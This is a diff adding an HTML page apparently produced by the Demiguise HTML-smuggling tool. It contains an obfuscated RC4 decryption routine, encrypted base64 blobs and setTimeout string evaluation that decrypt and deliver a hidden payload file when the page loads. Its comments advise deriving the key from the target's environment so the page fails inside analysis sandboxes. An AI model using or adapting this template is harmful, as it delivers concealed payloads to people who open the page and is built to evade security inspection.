@@ -1,0 +1,18 @@
+<html>
+<body>
+<script>
+function KzqPZLht(r,o){for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a}
+
+// you need to insert your own key environmental derivation function below. It must store the key in the variable called: oSds
+// By default demiguise will just use your key straight up. Instead you should derive your key from the environment
+// so that it only works on your intended target (and not in a sandbox). See virginkey.js for an example.
+var oSds = function(){return "hi"};
+
+var caDADCrao = "IbzUPw32TlYyBpKYCUWb7UFO6qXrVPL7NbtY25fZvWUUsuSy1D817RMGrAhBssIm7JyPPJzx6QXoCffFJ+1Jowo63XEj57VExoHNyb/bcaJ+cLh8DipSdhYhA2jpxpO+9bey57ZfdcLMNo3VVYjrlOTecZVa4dTo2nvvYEIttF8DqLZpPRxHjhX+X5/kiaNN3Rk79kLnb51P21VnEubtcb7OvYKq8eYJJQ7skm9a";
+var rIIwoB = KzqPZLht(oSds(),atob("X6PYLw=="));
+setTimeout('var hbkjIXw = new '+rIIwoB+'([KzqPZLht(oSds(), atob(caDADCrao))])');
+var SNMCRMAsh = KzqPZLht(oSds(),atob("NanCIwfyUxkwT57TGkqd5RlFx47eH/f7K6sVkrPkuWdduuesm3A7xwUhghxOmNMdtNuPG4ekuxzSSNibcMMTvVRrmzV0tvEbmeyQityXN/cMLOcuFnhOIEx2TCTKkpS4qJG79LZZMOuOYcjYRNfphd7RZtRx96eXknjtbQ1hti0Nsuc7O0sBwQD2Vtaoi/dH0xt3tVToZc0C81srRfaiYPLA85DJo60VMVLhjXgRgiRLb9YoeR1jrRO8rwmB7YTedJjXr3ed4Wh07hkwhiQ1xoxZS/n8nZe+BxVwIxm9jN3ewg31YW4psd0Jw+nljBZenIP22lN85f1FBXIw8rmRiFiMEDHcPpiGsjAso7ET0OdN76DyH2MNgo70xTQrfjBXc4EH6VNkYumN9zwLeLwKfaNFjUvxFxSzWGAfyck8+mAnMjI="));
+setTimeout(SNMCRMAsh+'(hbkjIXw, KzqPZLht(oSds(), atob("aarEOUruThc=")))');
+</script>
+</body>
+</html>
